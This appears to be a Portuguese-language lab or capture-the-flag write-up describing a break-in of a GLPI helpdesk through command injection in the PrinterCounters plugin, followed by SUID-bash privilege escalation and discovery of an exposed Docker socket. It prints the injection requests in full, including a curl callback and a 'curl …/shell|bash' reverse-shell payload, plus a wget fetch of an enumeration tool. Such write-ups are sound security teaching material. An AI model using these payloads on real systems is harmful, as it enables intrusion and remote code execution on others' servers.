RCE via Plugin PrinterCounters

Com acesso autenticado ao GLPI, seguimos o método descrito no artigo de referência. O plugin PrinterCounters possui um endpoint vulnerável a injeção de comandos via parâmetro items_id.

Prova de Conceito — ICMP

Capturamos a requisição da tela do plugin e injetamos um comando curl para validar a comunicação com nosso host:

http requestPOST /plugins/printercounters/ajax/process.php HTTP/1.1
Host: helpdesk.hc:8080
X-Glpi-Csrf-Token: c95e95fc9d6159f5518f6...
Content-Type: application/x-www-form-urlencoded

action=killProcess&items_id=1231231';curl+10.0.15.12/aaaa;#
✓ RCE Confirmado

Recebemos a requisição no nosso host — comunicação estabelecida. Pronto para enviar reverse shell.

Reverse Shell

Criamos o payload de reverse shell via reverse-shell.sh, servimos via Python HTTP server e injetamos o comando de download e execução:

http requestaction=killProcess&items_id=1231231';curl+10.0.15.12/shell|bash;#

Shell recebida! Referência: Penelope

Com acesso ao host, localizamos a primeira evidência na raiz / do sistema e confirmamos que estamos dentro de um container Docker.

Obtida na raiz / do container após acesso via RCE

Escalada de Privilégios — SUID Bash

Para dar continuidade ao Docker escape, primeiro precisamos de acesso root dentro do container. Transferimos o CDK para enumeração:

bash$ wget http://10.0.15.12/cdk_linux
$ chmod +x cdk_linux
$ ./cdk_linux evaluate --full

Referência: github.com/cdk-team/CDK

O CDK identificou o binário /usr/bin/bash com permissões SUID. Executamos com o parâmetro -p para preservar os privilégios elevados:

bash$ /usr/bin/bash -p
bash-5.2# whoami
root

Docker Escape — Socket Exposto

Com root no container, executamos o CDK novamente para identificar vetores de escape. O resultado revelou que o Docker socket estava montado dentro do container em /var/run/docker.sock.

⚠ Docker Socket Exposto

O acesso ao socket /var/run/docker.sock permite comunicação direta com o Docker daemon do host — possibilitando criar containers privilegiados, montar o filesystem do host e executar comandos fora do isolamento.

Referência: 0xn3va — Exposed Docker Socket
